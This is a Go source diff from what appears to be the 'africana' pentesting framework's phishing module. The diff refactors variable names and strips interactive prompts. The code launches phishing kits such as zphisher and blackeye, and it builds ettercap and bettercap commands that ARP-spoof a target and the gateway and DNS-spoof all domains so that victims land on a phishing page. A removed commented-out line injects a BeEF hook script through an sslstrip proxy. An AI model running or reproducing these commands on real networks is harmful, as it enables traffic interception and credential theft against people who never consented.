@@ -13,47 +13,44 @@ import(
 )
 
 var(
+    Name = "beef"
+    Pass = "Jesus"
+    Iface = "eth0"
+    LPort = "9999"
+    FakeDns = "Jesus is coming soon"
 
-    userInput   string
-    userRhost   string
-    userProxy   string
-    userModule  string
-
-    userName = "beef"
-    userPass = "Jesus"
-    userIface = "eth0"
-    userLPort = "9999"
-    userFakeDns = "Jesus is coming soon"
-
-    userLhost = userLhostIp
+    Lhost = LhostIp
+    LhostIp, _ = utils.GetDefaultIP()
     scanner = bufio.NewScanner(os.Stdin)
-    userLhostIp, _ = utils.GetDefaultIP()
-    userCertDir, userOutPutDir, userToolsDir, userWordList = utils.DirLocations()
+    Gateway, _ = utils.GetDefaultGatewayIP()
+    Input, Rhost, Proxy, Module, Target string
+    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, WordList = utils.DirLocations()
 )
 
 var defaultValues = map[string]string{
     "rhost": "",
+    "target": "",
     "module": "",
     "name": "beef",
     "iface": "eth0",
     "lport": "9999",
     "password": "Jesus",
     "fakedns": "Jesus is coming soon",
-    "lhost": userLhostIp,
-    "output": userOutPutDir,
+    "lhost": LhostIp,
+    "output": OutPutDir,
 }
 
 func PhishingPentest() {
     for {
         fmt.Printf("%s%safr3%s phishers(%s%s%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, "phishing_pentest.fn", bcolors.ENDC, bcolors.GREEN, bcolors.ENDC) 
         scanner.Scan()
-        userInput = strings.TrimSpace(strings.ToLower(scanner.Text()))
-        buildParts := strings.Fields(userInput)
+        Input = strings.TrimSpace(strings.ToLower(scanner.Text()))
+        buildParts := strings.Fields(Input)
         if len(buildParts) == 0 {
             continue
         }
 
-        if executeCommand(userInput) {
+        if executeCommand(Input) {
             continue
         }
 
@@ -69,7 +66,7 @@ func PhishingPentest() {
         case "run", "start", "launch", "exploit", "execute":
             executeModule()
         default:
-            utils.SystemShell(userInput)
+            utils.SystemShell(Input)
         }
     }
 }
@@ -197,16 +194,17 @@ func handleSetCommand(parts []string) {
     }
     key, value := parts[1], parts[2]
     setValues := map[string]*string{
-        "name": &userName,
-        "iface": &userIface,
-        "rhost": &userRhost,
-        "lport": &userLPort,
-        "proxy": &userProxy,
-        "lhost": &userLhostIp,
-        "module": &userModule,
-        "password": &userPass,
-        "fakedns": &userFakeDns,
-        "output": &userOutPutDir,
+        "name": &Name,
+        "target": &Rhost,
+        "iface": &Iface,
+        "rhost": &Rhost,
+        "lport": &LPort,
+        "proxy": &Proxy,
+        "lhost": &LhostIp,
+        "module": &Module,
+        "password": &Pass,
+        "fakedns": &FakeDns,
+        "output": &OutPutDir,
     }
     if ptr, exists := setValues[key]; exists {
         *ptr = value
@@ -223,16 +221,17 @@ func handleUnsetCommand(parts []string) {
     }
     key := parts[1]
     unsetValues := map[string]*string{
-        "name": &userName,
-        "iface": &userIface,
-        "rhost": &userRhost,
-        "lport": &userLPort,
-        "proxy": &userProxy,
-        "lhost": &userLhostIp,
-        "module": &userModule,
-        "password": &userPass,
-        "fakedns": &userFakeDns,
-        "output": &userOutPutDir,
+        "name": &Name,
+        "iface": &Iface,
+        "rhost": &Rhost,
+        "target": &Rhost,
+        "lport": &LPort,
+        "proxy": &Proxy,
+        "lhost": &LhostIp,
+        "module": &Module,
+        "password": &Pass,
+        "fakedns": &FakeDns,
+        "output": &OutPutDir,
     }
     if ptr, exists := unsetValues[key]; exists {
         *ptr = defaultValues[key] // Reset to default
@@ -243,20 +242,20 @@ func handleUnsetCommand(parts []string) {
 }
 
 func executeModule() {
-    if userModule == ""{
+    if Module == ""{
         fmt.Printf("\n%s[!] %sMissing required parameter MODULE. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
         return
     }
 
-    PhishingPenModules(userModule)
+    PhishingPenModules(Module)
 }
 
 
 func PhishingPenModules(module string, args ...interface{}) {
     fmt.Printf("\nMODULE => %s\n", module)
-    if userProxy != "" {
-        fmt.Printf("PROXIES => %s\n", userProxy)
-        utils.SetProxy(userProxy)
+    if Proxy != "" {
+        fmt.Printf("PROXIES => %s\n", Proxy)
+        utils.SetProxy(Proxy)
     }
 
     commands := map[string]func() {
@@ -290,75 +289,44 @@ func GoodGinx() {
 }
 
 func Thc() {
-    subprocess.Popen(`cd %s/phishers/thc/; bash thc.sh`, userToolsDir)
+    subprocess.Popen(`cd %s/phishers/thc/; bash thc.sh`, ToolsDir)
 }
 
 func SetoolKit() {
-    subprocess.Popen(`cd %s/phishers/set/; python3 setoolkit`, userToolsDir)
+    subprocess.Popen(`cd %s/phishers/set/; python3 setoolkit`, ToolsDir)
 }
 
 func ZPhisher() {
-    subprocess.Popen(`cd %s/phishers/zphisher/; bash zphisher.sh`, userToolsDir)
+    subprocess.Popen(`cd %s/phishers/zphisher/; bash zphisher.sh`, ToolsDir)
 }
 
 func Blackeye() {
-    subprocess.Popen(`cd %s/phishers/blackeye/; bash blackeye.sh`, userToolsDir)
+    subprocess.Popen(`cd %s/phishers/blackeye/; bash blackeye.sh`, ToolsDir)
 }
 
 func ShellPhish() {
-    subprocess.Popen(`cd %s/phishers/shellphish/; bash shellphish.sh`, userToolsDir)
+    subprocess.Popen(`cd %s/phishers/shellphish/; bash shellphish.sh`, ToolsDir)
 }
 
 func Darkphish() {
-    subprocess.Popen(`cd %s/phishers/darkphish/; python3 dark-phish.py`, userToolsDir)
+    subprocess.Popen(`cd %s/phishers/darkphish/; python3 dark-phish.py`, ToolsDir)
 }
 
 func AdvPhisher() {
-    subprocess.Popen(`cd %s/phishers/advphishing/; bash advphishing.sh`, userToolsDir)
+    subprocess.Popen(`cd %s/phishers/advphishing/; bash advphishing.sh`, ToolsDir)
 }
 
 func CyberPhish() {
-    subprocess.Popen(`cd %s/phishers/cyberphish/; python3 cyberphish.py`, userToolsDir)
+    subprocess.Popen(`cd %s/phishers/cyberphish/; python3 cyberphish.py`, ToolsDir)
 }
 
-func NinjaEttercap(userRhost string) {
-    userLhostIp, err := utils.GetDefaultIP()
-    if err != nil {
-        fmt.Printf("Error getting default userLhostIp:", err)
-        os.Exit(1)
-    }
-    menus.MenuSevenOne()
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap" + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
+func NinjaEttercap(Rhost string) {
     scanner.Scan()
-    userInput := scanner.Text()
-    switch strings.ToLower(userInput) {
+    Input := scanner.Text()
+    switch strings.ToLower(Input) {
     case "0":
         return
     case "1":
-        fmt.Println()
-        subprocess.Popen(`ip address`)
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN + "interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userIface := scanner.Text()
-        if userIface == "" {
-            userIface = "eth0"
-        }
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN+ "lhost " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userLhost := scanner.Text()
-        if userLhost == "" {
-            userLhost = userLhostIp
-        }
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userFakeDns := scanner.Text()
-        if userFakeDns == "" {
-            userFakeDns = "*"
-        }
         filePathO := "/etc/ettercap/etter.conf.bak_africana"
         if _, err := os.Stat(filePathO); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
@@ -377,7 +345,7 @@ func NinjaEttercap(userRhost string) {
         filePathT := "/etc/ettercap/etter.dns.bak_africana"
         if _, err := os.Stat(filePathT); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
+            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
             filesToReplacements := map[string]map[string]string{
                 "/etc/ettercap/etter.dns": {
                     `# vim:ts=8:noexpandtab`: newString,
@@ -385,39 +353,11 @@ func NinjaEttercap(userRhost string) {
             }
         utils.Editors(filesToReplacements)
         }
-        userGateway, err := utils.GetDefaultGatewayIP()
-        if err != nil {
-            panic(err)
-        }
-        fmt.Println()
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, userIface, userRhost, userGateway)
-        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, userToolsDir)
+        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, Iface, Rhost, Gateway)
+        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
         fmt.Println()
         subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     case "2":
-        fmt.Println()
-        subprocess.Popen(`ip address`)
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN + "interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userIface := scanner.Text()
-        if userIface == "" {
-            userIface = "eth0"
-        }
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN+ "lhost " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userLhost := scanner.Text()
-        if userLhost == "" {
-            userLhost = userLhostIp
-        }
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userFakeDns := scanner.Text()
-        if userFakeDns == "" {
-            userFakeDns = "*"
-        }
         filePathO := "/etc/ettercap/etter.conf.bak_africana"
         if _, err := os.Stat(filePathO); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
@@ -436,7 +376,7 @@ func NinjaEttercap(userRhost string) {
         filePathT := "/etc/ettercap/etter.dns.bak_africana"
         if _, err := os.Stat(filePathT); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
+            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
             filesToReplacements := map[string]map[string]string{
                 "/etc/ettercap/etter.dns": {
                     `# vim:ts=8:noexpandtab`: newString,
@@ -445,96 +385,44 @@ func NinjaEttercap(userRhost string) {
         utils.Editors(filesToReplacements)
         }
         fmt.Println()
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, userIface)
-        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, userToolsDir)
+        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, Iface)
+        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
         fmt.Println()
         subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     default:
-        utils.SystemShell(userInput)
+        utils.SystemShell(Input)
     }
     fmt.Println()
 }
 
-func NinjaBettercap(userRhost string) {
-    userLhostIp, err := utils.GetDefaultIP()
-    if err != nil {
-        fmt.Printf("Error getting default userLhostIp:", err)
-        os.Exit(1)
-    }
-    menus.MenuSevenOne()
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaBettercap" + bcolors.BLUE + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
+func NinjaBettercap(Rhost string, Iface string, Target string) {
     scanner.Scan()
-    userInput := scanner.Text()
-    switch strings.ToLower(userInput) {
+    Input := scanner.Text()
+    switch strings.ToLower(Input) {
     case "0":
         return
     case "1":
-        fmt.Println()
-        subprocess.Popen(`ip address`)
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN + "interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userIface := scanner.Text()
-        if userIface == "" {
-            userIface = "eth0"
-        }
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN+ "lhost " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userLhost := scanner.Text()
-        if userLhost == "" {
-            userLhost = userLhostIp
-        }
-        //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.afr3/certs/africana-cert.pem; set https.proxy.key /root/.afr3/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userRhost, userLhost)
-        fmt.Println()
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, userIface, userRhost)
-        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, userToolsDir)
+        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, Iface, Rhost)
+        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
     case "2":
-        fmt.Println()
-        subprocess.Popen(`ip address`)
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN + "interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userIface := scanner.Text()
-        if userIface == "" {
-            userIface = "eth0"
-        }
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN+ "lhost " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userLhost := scanner.Text()
-        if userLhost == "" {
-            userLhost = userLhostIp
-        }
-        //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.afr3/certs/africana-cert.pem; set https.proxy.key /root/.afr3/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userLhost)
-        fmt.Println()
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, userIface)
-        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, userToolsDir)
+        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, Iface)
+        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
     default:
-        utils.SystemShell(userInput)
+        utils.SystemShell(Input)
     }
 }
 
-func NinjaPhish(userRhost string) {
+func NinjaPhish(Rhost string) {
     for {
-        menus.MenuThreeThree()
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaIPhish " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "> " + bcolors.ENDC)
-        scanner.Scan()
-        userInput := scanner.Text()
-        if userInput == "" {
-            userInput = "1"
-         }
-        switch userInput {
+        switch Input {
         case "0":
             return
         case "1":
-            NinjaEttercap(userRhost)
+            NinjaEttercap(Rhost)
         case "2":
-            NinjaBettercap(userRhost)
+            NinjaBettercap(Rhost)
         default:
-            utils.SystemShell(userInput)
+            utils.SystemShell(Input)
          }
     }
 }
